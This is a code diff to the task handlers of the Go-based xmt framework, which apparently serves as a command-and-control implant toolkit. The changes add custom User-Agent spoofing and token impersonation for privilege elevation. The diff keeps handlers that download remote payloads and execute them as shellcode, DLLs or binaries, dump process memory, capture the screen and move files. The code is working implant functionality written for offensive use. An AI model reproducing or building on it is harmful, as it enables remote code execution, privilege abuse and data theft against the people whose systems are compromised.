@@ -20,6 +20,7 @@ import (
 	"github.com/iDigitalFlame/xmt/device/screen"
 	"github.com/iDigitalFlame/xmt/man"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
+	"github.com/iDigitalFlame/xmt/util/text"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
@@ -48,7 +49,7 @@ var _ backer = (*data.Chunk)(nil)
 var _ backer = (*com.Packet)(nil)
 
 type backer interface {
-	Payload() []byte
+	WriteUint32Pos(int, uint32) error
 }
 
 // Callable is an internal interface used to specify a wide range of Runnabale
@@ -114,35 +115,61 @@ func rawParse(r string) (*url.URL, error) {
 	}
 	return u, nil
 }
-func request(u string, r *http.Request) (*http.Response, error) {
+func request(u, a string, r *http.Request) (*http.Response, error) {
 	client.Do(initDefaultClient)
-	r.Header.Set(userAgent, userValue)
+	if len(a) > 0 {
+		r.Header.Set(userAgent, text.Matcher(a).String())
+	} else {
+		r.Header.Set(userAgent, userValue)
+	}
 	var err error
 	if r.URL, err = rawParse(u); err != nil {
 		return nil, err
 	}
 	return client.v.Do(r)
 }
-func taskPull(x context.Context, r data.Reader, w data.Writer) error {
-	u, err := r.StringVal()
+func taskWait(x context.Context, r data.Reader, _ data.Writer) error {
+	d, err := r.Int64()
 	if err != nil {
 		return err
 	}
-	p, err := r.StringVal()
+	if d <= 0 {
+		return nil
+	}
+	t := time.NewTimer(time.Duration(d))
+	select {
+	case <-t.C:
+	case <-x.Done():
+	}
+	t.Stop()
+	return nil
+}
+func taskPull(x context.Context, r data.Reader, w data.Writer) error {
+	var (
+		u, a, p string
+		err     = r.ReadString(&u)
+	)
 	if err != nil {
+		return err
+	}
+	if err = r.ReadString(&a); err != nil {
+		return err
+	}
+	if err = r.ReadString(&p); err != nil {
 		return err
 	}
 	var (
 		h, _ = http.NewRequestWithContext(x, http.MethodGet, "*", nil)
 		o    *http.Response
 	)
-	if o, err = request(u, h); err != nil {
+	if o, err = request(u, a, h); err != nil {
 		return err
 	}
 	var (
 		v = device.Expand(p)
 		f *os.File
 	)
+	// 0x242 - CREATE | TRUNCATE | RDWR
 	if f, err = os.OpenFile(v, 0x242, 0755); err != nil {
 		o.Body.Close()
 		return err
@@ -162,6 +189,7 @@ func taskUpload(x context.Context, r data.Reader, w data.Writer) error {
 		v = device.Expand(s)
 		f *os.File
 	)
+	// 0x242 - CREATE | TRUNCATE | RDWR
 	if f, err = os.OpenFile(v, 0x242, 0644); err != nil {
 		return err
 	}
@@ -172,6 +200,19 @@ func taskUpload(x context.Context, r data.Reader, w data.Writer) error {
 	w.WriteString(v)
 	w.WriteInt64(c)
 	return err
+}
+func taskElevate(_ context.Context, r data.Reader, _ data.Writer) error {
+	var f filter.Filter
+	if err := f.UnmarshalStream(r); err != nil {
+		return err
+	}
+	if f.Empty() {
+		f = filter.Filter{Elevated: filter.True}
+	}
+	return device.Impersonate(&f)
+}
+func taskRevSelf(_ context.Context, _ data.Reader, _ data.Writer) error {
+	return device.RevertToSelf()
 }
 func taskDownload(x context.Context, r data.Reader, w data.Writer) error {
 	s, err := r.StringVal()
@@ -192,6 +233,7 @@ func taskDownload(x context.Context, r data.Reader, w data.Writer) error {
 	}
 	w.WriteBool(false)
 	w.WriteInt64(i.Size())
+	// 0 - READONLY
 	f, err := os.OpenFile(v, 0, 0)
 	if err != nil {
 		return err
@@ -202,19 +244,25 @@ func taskDownload(x context.Context, r data.Reader, w data.Writer) error {
 	return err
 }
 func taskPullExec(x context.Context, r data.Reader, w data.Writer) error {
-	u, err := r.StringVal()
+	var (
+		u, a string
+		z    bool
+		err  = r.ReadString(&u)
+	)
 	if err != nil {
 		return err
 	}
-	z, err := r.Bool()
-	if err != nil {
+	if err = r.ReadString(&a); err != nil {
+		return err
+	}
+	if err = r.ReadBool(&z); err != nil {
 		return err
 	}
 	var f *filter.Filter
 	if err = filter.UnmarshalStream(r, &f); err != nil {
 		return err
 	}
-	e, p, err := WebResource(x, w, z, u)
+	e, p, err := WebResource(x, w, z, a, u)
 	if err != nil {
 		if len(p) > 0 {
 			os.Remove(p)
@@ -252,9 +300,8 @@ func taskPullExec(x context.Context, r data.Reader, w data.Writer) error {
 		s    = w.(backer)
 		//     ^ This should NEVER panic!
 	)
-	o := s.Payload()
-	o[0], o[1], o[2], o[3] = byte(i>>24), byte(i>>16), byte(i>>8), byte(i)
-	o[4], o[5], o[6], o[7] = byte(c>>24), byte(c>>16), byte(c>>8), byte(c)
+	s.WriteUint32Pos(0, i)
+	s.WriteUint32Pos(4, uint32(c))
 	return nil
 }
 func taskProcDump(_ context.Context, r data.Reader, w data.Writer) error {
@@ -263,24 +310,6 @@ func taskProcDump(_ context.Context, r data.Reader, w data.Writer) error {
 		return err
 	}
 	return device.DumpProcess(f, w)
-}
-func taskProcList(_ context.Context, _ data.Reader, w data.Writer) error {
-	e, err := cmd.Processes()
-	if err != nil {
-		return err
-	}
-	if err = w.WriteUint32(uint32(len(e))); err != nil {
-		return err
-	}
-	if len(e) == 0 {
-		return nil
-	}
-	for i, m := uint32(0), uint32(len(e)); i < m; i++ {
-		if err = e[i].MarshalStream(w); err != nil {
-			return err
-		}
-	}
-	return nil
 }
 func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 	t, err := r.Uint8()
@@ -309,7 +338,8 @@ func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 		if _, err = os.Stat(k); err == nil {
 			return nil
 		}
-		f, err1 := os.Create(k)
+		// 0x242 - CREATE | TRUNCATE | RDWR
+		f, err1 := os.OpenFile(k, 0x242, 0644)
 		if err1 != nil {
 			return err1
 		}
@@ -364,10 +394,12 @@ func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 			k    = device.Expand(n)
 			u    = device.Expand(d)
 		)
-		if s, err = os.Open(k); err != nil {
+		// 0 - READONLY
+		if s, err = os.OpenFile(k, 0, 0); err != nil {
 			return err
 		}
-		if f, err = os.Create(u); err != nil {
+		// 0x242 - CREATE | TRUNCATE | RDWR
+		if f, err = os.OpenFile(u, 0x242, 0644); err != nil {
 			s.Close()
 			return err
 		}
@@ -412,8 +444,11 @@ func taskScreenShot(_ context.Context, _ data.Reader, w data.Writer) error {
 	return screen.Capture(w)
 }
 
-// WebResource will attempt to download the URL target at 'u' and parse the
+// WebResource will attempt to download the URL target at 'url' and parse the
 // data into a Runnable interface.
+//
+// The supplied 'agent' string (if non-empty) will specify the User-Agent header
+// string to be used.
 //
 // The passed Writer will be passed as Stdout/Stderr to certain processes if
 // the 'z' flag is true.
@@ -423,10 +458,10 @@ func taskScreenShot(_ context.Context, _ data.Reader, w data.Writer) error {
 //
 // This function uses the 'man.ParseDownloadHeader' function to assist with
 // determining the executable type.
-func WebResource(x context.Context, w data.Writer, z bool, u string) (cmd.Runnable, string, error) {
+func WebResource(x context.Context, w data.Writer, z bool, agent, url string) (cmd.Runnable, string, error) {
 	var (
 		r, _   = http.NewRequestWithContext(x, http.MethodGet, "*", nil)
-		o, err = request(u, r)
+		o, err = request(url, agent, r)
 	)
 	if err != nil {
 		return nil, "", err
@@ -436,7 +471,7 @@ func WebResource(x context.Context, w data.Writer, z bool, u string) (cmd.Runnab
 		return nil, "", err
 	}
 	if bugtrack.Enabled {
-		bugtrack.Track("task.WebResource(): Download u=%s", u)
+		bugtrack.Track("task.WebResource(): Download agent=%s, url=%s", agent, url)
 	}
 	var d bool
 	switch man.ParseDownloadHeader(o.Header) {
@@ -444,7 +479,7 @@ func WebResource(x context.Context, w data.Writer, z bool, u string) (cmd.Runnab
 		d = true
 	case 2:
 		if bugtrack.Enabled {
-			bugtrack.Track("task.WebResource(): Download is shellcode u=%s", u)
+			bugtrack.Track("task.WebResource(): Download is shellcode url=%s", url)
 		}
 		return cmd.NewAsmContext(x, b), "", nil
 	case 3:
@@ -478,7 +513,7 @@ func WebResource(x context.Context, w data.Writer, z bool, u string) (cmd.Runnab
 		return nil, n, err
 	}
 	if bugtrack.Enabled {
-		bugtrack.Track("task.WebResource(): Download to tempfile u=%s, n=%s", u, n)
+		bugtrack.Track("task.WebResource(): Download to tempfile url=%s, n=%s", url, n)
 	}
 	if os.Chmod(n, 0755); d {
 		return cmd.NewDllContext(x, n), n, nil
